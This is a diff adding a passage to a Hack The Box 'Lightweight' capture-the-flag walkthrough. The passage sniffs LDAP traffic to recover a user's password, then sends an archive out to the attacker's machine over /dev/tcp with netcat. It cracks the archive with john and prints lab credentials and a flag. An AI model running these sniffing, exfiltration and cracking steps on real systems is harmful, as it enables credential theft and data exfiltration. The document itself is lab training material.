@@ -155,9 +155,111 @@ So lets decrypt it with john :
 
 But the crack is impossible so let's try sniffing with tcpdump.
 
+` /usr/sbin/tcpdump -i lo port 389 -w capture.cap -v`
+
+We can visit each page of the website for generate traffic and after 5minutes we cate click ctrl+C and see :
+
+```BASH
+[10.10.14.145@lightweight ~]$ strings capture.cap 
+<g[@
+4g\@
+1!0Y
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac25
+4g^@
+;g_@
+4g`@
+4ga@
+750Y
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac26
+<hW@
+4hX@
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac29
+4hZ@
+;h[@
+4h\@
+4h]@
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac2F
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac2I
+<\VS
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac2e
+<]VS
+<]VS
+<kVS
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac2i
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac2m
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac2r
+\$0Y
+-uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+ 8bc8251332abe1d7f105d3e53ad39ac2
+```
+
+`8bc8251332abe1d7f105d3e53ad39ac2` is the ldapuser2 password
+
+```BASH
+[10.10.14.145@lightweight ~]$ su ldapuser2
+Password: 
+[ldapuser2@lightweight 10.10.14.145]$ 
+[ldapuser2@lightweight 10.10.14.145]$ cd ..
+[ldapuser2@lightweight home]$ ls
+10.10.14.145  10.10.14.2  127.0.0.1  ldapuser1	ldapuser2
+[ldapuser2@lightweight home]$ cd ldapuser2
+[ldapuser2@lightweight ~]$ ls
+backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
+```
+
+On the attacker machine : `nc -lvnp 4444 > backup.7z`
+On the victim : `cat backup.7z > /dev/tcp/10.10.14.145/4444`
+
+Now we want to crack the password :
+
+```BASH
+┌─[eu-dedivip-1]─[10.10.14.145]─[bobinette@htb-c1k7cd5ny7]─[~]
+└──╼ [★]$ 7z2john backup.7z > backup_hash.txt
+ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
+┌─[eu-dedivip-1]─[10.10.14.145]─[bobinette@htb-c1k7cd5ny7]─[~]
+└──╼ [★]$ john --wordlist=Desktop/rockyou.txt backup_hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 512/512 AVX512BW 16x AES])
+Cost 1 (iteration count) is 524288 for all loaded hashes
+Cost 2 (padding size) is 12 for all loaded hashes
+Cost 3 (compression type) is 2 for all loaded hashes
+Cost 4 (data length) is 3140 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+delete           (backup.7z)     
+1g 0:00:00:12 DONE (2025-04-25 10:25) 0.07917g/s 167.2p/s 167.2c/s 167.2C/s slimshady..morado
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+The password is delete
+
+In the file status.php we find this :
+
+```PHP
+$username = 'ldapuser1';
+$password = 'f3ca9d298a553da117442deeb6fa932d';
+```
+
 ## 5. **Installation**
 
 ## 6. **Command and Control**
 
 ## 7. **Actions on Objectives**
+
+Flag for ldapuser2 :
+
+```BASH
+[ldapuser2@lightweight ~]$ cat user.txt 
+d0e63c6553c027f227b9a728908d98e5
+```
 
